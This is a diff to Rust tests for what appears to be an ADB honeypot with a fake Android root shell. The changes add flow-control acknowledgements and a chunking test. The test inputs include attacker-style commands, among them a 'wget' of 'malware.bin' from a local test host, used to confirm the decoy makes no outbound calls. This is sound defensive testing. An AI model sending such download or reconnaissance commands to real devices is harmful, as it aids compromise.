@@ -122,6 +122,14 @@ async fn open_stream(stream: &mut TcpStream, local_id: u32, dest: &str) -> u32 {
     header.arg0
 }
 
+async fn acknowledge_wrte(stream: &mut TcpStream, header: &Header) {
+    assert_eq!(header.command, adb_proto::A_WRTE);
+    stream
+        .write_all(&adb_proto::build_okay(header.arg1, header.arg0))
+        .await
+        .unwrap();
+}
+
 /// Send one line of shell input and read back the outer OKAY ack plus the WRTE-wrapped output.
 async fn send_shell_line(
     stream: &mut TcpStream,
@@ -137,9 +145,17 @@ async fn send_shell_line(
         .unwrap();
     let (ack, _) = read_message(stream).await;
     assert_eq!(ack.command, adb_proto::A_OKAY);
-    let (wrte, data) = read_message(stream).await;
-    assert_eq!(wrte.command, adb_proto::A_WRTE);
-    String::from_utf8_lossy(&data).into_owned()
+    let mut output = Vec::new();
+    loop {
+        let (wrte, data) = read_message(stream).await;
+        assert_eq!(wrte.command, adb_proto::A_WRTE);
+        output.extend_from_slice(&data);
+        acknowledge_wrte(stream, &wrte).await;
+        if output.ends_with(b"# ") || output.ends_with(b"$ ") {
+            break;
+        }
+    }
+    String::from_utf8_lossy(&output).into_owned()
 }
 
 /// Drive a full `sync:` `SEND` (push) as separate WRTE-per-sync-submessage writes, exactly as a
@@ -211,6 +227,62 @@ async fn cnxn_handshake_completes() {
 }
 
 #[tokio::test]
+async fn shell_output_obeys_peer_maxdata_and_waits_for_each_okay() {
+    let srv = TestServer::start().await;
+    let mut conn = TcpStream::connect(srv.addr).await.unwrap();
+    conn.write_all(&adb_proto::build_message(
+        adb_proto::A_CNXN,
+        adb_proto::OUR_VERSION,
+        7,
+        adb_proto::host_banner().as_bytes(),
+    ))
+    .await
+    .unwrap();
+    let (cnxn, _) = read_message(&mut conn).await;
+    assert_eq!(cnxn.command, adb_proto::A_CNXN);
+
+    conn.write_all(&adb_proto::build_open(4, "shell:id"))
+        .await
+        .unwrap();
+    let (okay, _) = read_message(&mut conn).await;
+    assert_eq!(okay.command, adb_proto::A_OKAY);
+    let server_id = okay.arg0;
+
+    let (first, first_data) = read_message(&mut conn).await;
+    assert_eq!(first.command, adb_proto::A_WRTE);
+    assert_eq!(first_data.len(), 7);
+    let mut probe = [0u8; 1];
+    assert!(
+        tokio::time::timeout(Duration::from_millis(100), conn.peek(&mut probe))
+            .await
+            .is_err(),
+        "the server sent a second WRTE before the first was acknowledged"
+    );
+
+    let mut output = first_data;
+    conn.write_all(&adb_proto::build_okay(4, server_id))
+        .await
+        .unwrap();
+    loop {
+        let (header, data) = read_message(&mut conn).await;
+        match header.command {
+            adb_proto::A_WRTE => {
+                assert!(data.len() <= 7, "WRTE exceeded peer maxdata");
+                output.extend_from_slice(&data);
+                conn.write_all(&adb_proto::build_okay(4, server_id))
+                    .await
+                    .unwrap();
+            }
+            adb_proto::A_CLSE => break,
+            other => panic!("unexpected ADB command {other:#x}"),
+        }
+    }
+    assert!(String::from_utf8_lossy(&output).contains("uid=0"));
+    assert!(output.windows(2).any(|pair| pair == b"\r\n"));
+    srv.handle.abort();
+}
+
+#[tokio::test]
 async fn shell_command_capture_via_fakeshell() {
     let srv = TestServer::start().await;
     let mut conn = TcpStream::connect(srv.addr).await.unwrap();
@@ -221,6 +293,7 @@ async fn shell_command_capture_via_fakeshell() {
     let (prompt_hdr, prompt_data) = read_message(&mut conn).await;
     assert_eq!(prompt_hdr.command, adb_proto::A_WRTE);
     assert!(!prompt_data.is_empty());
+    acknowledge_wrte(&mut conn, &prompt_hdr).await;
 
     let output = send_shell_line(&mut conn, 7, server_id, "whoami").await;
     assert!(output.contains("root"), "output: {output}");
@@ -254,17 +327,34 @@ async fn interactive_shell_closes_only_after_the_outer_android_shell_exits() {
         String::from_utf8_lossy(&prompt_data),
         sensor_framework::persona::android_root_prompt("/")
     );
+    acknowledge_wrte(&mut conn, &prompt).await;
+
+    let blank = send_shell_line(&mut conn, local_id, server_id, "").await;
+    assert_eq!(
+        blank,
+        format!(
+            "\r\n{}",
+            sensor_framework::persona::android_root_prompt("/")
+        ),
+        "empty Enter echoes a newline and reprints the prompt"
+    );
 
     let nested = send_shell_line(&mut conn, local_id, server_id, "sh").await;
     assert_eq!(
         nested,
-        sensor_framework::persona::android_root_prompt("/"),
+        format!(
+            "sh\r\n{}",
+            sensor_framework::persona::android_root_prompt("/")
+        ),
         "opening a nested Android shell keeps the stream open"
     );
     let returned = send_shell_line(&mut conn, local_id, server_id, "exit").await;
     assert_eq!(
         returned,
-        sensor_framework::persona::android_root_prompt("/"),
+        format!(
+            "exit\r\n{}",
+            sensor_framework::persona::android_root_prompt("/")
+        ),
         "the first exit returns to the outer shell"
     );
 
@@ -273,6 +363,9 @@ async fn interactive_shell_closes_only_after_the_outer_android_shell_exits() {
         .unwrap();
     let (ack, _) = read_message(&mut conn).await;
     assert_eq!(ack.command, adb_proto::A_OKAY);
+    let (final_output, final_data) = read_message(&mut conn).await;
+    assert_eq!(final_data, b"exit\r\n");
+    acknowledge_wrte(&mut conn, &final_output).await;
     let (close, _) = read_message(&mut conn).await;
     assert_eq!(close.command, adb_proto::A_CLSE);
     assert_eq!(close.arg0, server_id);
@@ -379,6 +472,7 @@ async fn shell_payload_session(
     // The server sends its prompt as a WRTE once the interactive stream is open.
     let (prompt, _) = read_message(&mut conn).await;
     assert_eq!(prompt.command, adb_proto::A_WRTE);
+    acknowledge_wrte(&mut conn, &prompt).await;
 
     conn.write_all(&adb_proto::build_wrte(1, server_id, payload))
         .await
@@ -513,6 +607,7 @@ async fn a_plaintext_adb_shell_session_is_never_captured() {
     let server_id = open_stream(&mut conn, 1, "shell:").await;
     let (prompt, _) = read_message(&mut conn).await;
     assert_eq!(prompt.command, adb_proto::A_WRTE);
+    acknowledge_wrte(&mut conn, &prompt).await;
 
     send_shell_line(&mut conn, 1, server_id, "uname -a").await;
     send_shell_line(&mut conn, 1, server_id, "cat /proc/mounts").await;
@@ -583,7 +678,8 @@ async fn protocol_label_and_authenticated_false_on_all_events() {
     cnxn_handshake(&mut conn).await;
 
     let shell_id = open_stream(&mut conn, 2, "shell:").await;
-    let _ = read_message(&mut conn).await; // initial prompt
+    let (prompt, _) = read_message(&mut conn).await;
+    acknowledge_wrte(&mut conn, &prompt).await;
     send_shell_line(&mut conn, 2, shell_id, "id").await;
 
     let sync_id = open_stream(&mut conn, 3, "sync:").await;
@@ -663,7 +759,8 @@ async fn no_outbound_connections_from_wget_in_shell() {
     let mut conn = TcpStream::connect(srv.addr).await.unwrap();
     cnxn_handshake(&mut conn).await;
     let server_id = open_stream(&mut conn, 1, "shell:").await;
-    let _ = read_message(&mut conn).await; // initial prompt
+    let (prompt, _) = read_message(&mut conn).await;
+    acknowledge_wrte(&mut conn, &prompt).await;
 
     let cmd = format!("wget http://127.0.0.1:{}/malware.bin", target_addr.port());
     send_shell_line(&mut conn, 1, server_id, &cmd).await;
@@ -800,7 +897,8 @@ async fn multiple_shell_commands_each_captured_as_separate_events_in_order() {
     let mut conn = TcpStream::connect(srv.addr).await.unwrap();
     cnxn_handshake(&mut conn).await;
     let server_id = open_stream(&mut conn, 1, "shell:").await;
-    let _ = read_message(&mut conn).await; // initial prompt
+    let (prompt, _) = read_message(&mut conn).await;
+    acknowledge_wrte(&mut conn, &prompt).await;
 
     send_shell_line(&mut conn, 1, server_id, "whoami").await;
     send_shell_line(&mut conn, 1, server_id, "id").await;
@@ -859,7 +957,8 @@ async fn concurrent_shell_and_sync_streams_on_one_connection() {
     cnxn_handshake(&mut conn).await;
 
     let shell_server_id = open_stream(&mut conn, 10, "shell:").await;
-    let _ = read_message(&mut conn).await; // initial prompt
+    let (prompt, _) = read_message(&mut conn).await;
+    acknowledge_wrte(&mut conn, &prompt).await;
     let sync_server_id = open_stream(&mut conn, 20, "sync:").await;
     assert_ne!(shell_server_id, sync_server_id);
 
@@ -899,7 +998,8 @@ async fn shell_streams_of_one_connection_share_one_command_ceiling() {
     let mut streams = Vec::new();
     for local_id in 1..=4u32 {
         let server_id = open_stream(&mut conn, local_id, "shell:").await;
-        let _ = read_message(&mut conn).await; // initial prompt
+        let (prompt, _) = read_message(&mut conn).await;
+        acknowledge_wrte(&mut conn, &prompt).await;
         streams.push((local_id, server_id));
     }
     // Four streams of 64 lines are the connection's 256 command events.
@@ -939,7 +1039,8 @@ async fn a_connection_that_has_spent_its_egress_allowance_is_dropped_after_that_
     let mut conn = TcpStream::connect(srv.addr).await.unwrap();
     cnxn_handshake(&mut conn).await;
     let server_id = open_stream(&mut conn, 10, "shell:").await;
-    let _ = read_message(&mut conn).await; // initial prompt
+    let (prompt, _) = read_message(&mut conn).await;
+    acknowledge_wrte(&mut conn, &prompt).await;
 
     // Each `cat /dev/zero` answers with one MiB and a prompt; the connection may write 16 MiB.
     // The 16th reply is the one that reaches the cap, and it arrives whole.
